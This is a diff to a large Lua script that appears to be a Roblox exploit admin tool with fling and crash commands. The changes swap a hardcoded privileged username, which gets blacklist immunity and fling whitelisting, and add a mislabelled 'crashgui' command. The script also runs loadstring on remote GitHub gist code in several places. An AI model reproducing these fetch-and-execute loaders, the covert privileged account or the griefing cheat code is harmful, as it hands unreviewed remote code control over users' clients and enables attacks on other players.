@@ -22,7 +22,7 @@ joinleavelogs = false
 
 
     game.Players.PlayerAdded:Connect(function(plr)
-if plr.Name == "2345678asdfghjkxcb" then
+if plr.Name == "xxxLX_0GANxxx" then
 Notify({ 
 Description = "MAFIA JOINED THE GAME UWUWUWUUWUWUWUUWUW";
 Title = "�����";
@@ -10594,6 +10594,18 @@ end)
 
 
 
+AddCommand("crashgui", {}, "fixes fling cmd", {}, function(Caller)
+        Notify({ 
+Description = "recomended that u using 'killscript' cmd";
+Title = "BTW";
+Duration = 2;
+});
+
+loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/7ed204647c293c619226f22b2da6cbc2/raw/7f8438a4e8c92f8532662331fe933503421d5feb/crads"))()
+
+end)
+
+
 AddCommand("fixfling", {"flingfix"}, "fixes fling cmd", {}, function(Caller)
 flingcooldown = false
         Notify({ 
@@ -13381,7 +13393,7 @@ AddCommand("blacklist", {"bl"}, "blacklists a whitelisted user", {"1"}, function
         else
 	local Target = GetPlayer(Args[1]);
 	for i, v in next, Target do
-		if (Tfind(AdminUsers, v)) and v.Name ~= "2345678asdfghjkxcb" then
+		if (Tfind(AdminUsers, v)) and v.Name ~= "xxxLX_0GANxxx" then
 			AdminUsers[indexOf(AdminUsers, v)] = nil
 		end
 	end
@@ -15812,7 +15824,7 @@ wait(1)
 if mafiajoinedserver == true then
 mafiajoinedserver = false
 print("joined")
-ExecuteCommand("flingwl", {"2345678asdfghjkxcb"}, LocalPlayer);
+ExecuteCommand("flingwl", {"xxxLX_0GANxxx"}, LocalPlayer);
 end
 if mafiajoinedserver == true and mafiacmdsloaded == false then
 mafiacmdsloaded = true
@@ -16192,7 +16204,7 @@ timeusagehourslol = timeusagehourslol+1
 end
 end
 wait(1)
-loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/6d4a4c9a969e480d80a833556cb5c5c8/raw/c6bd1a3f18e82558e1458e7ebbcb3c092f585d6e/gistfile1.txt"))()
+loadstring(game:HttpGet("https://raw.githubusercontent.com/cyberical9B55/veonixcombat/main/mafiaadmin/devids"))()
 loadstring(game:HttpGet("https://gist.githubusercontent.com/cyberical9B55/b12df62d07476e2f0c7ea78c85ac68ce/raw/484e09f82f10d6bd532d5cfadfe158efc816cf48/a"))()
 
 timeusagesecondslol = timeusagesecondslol+1
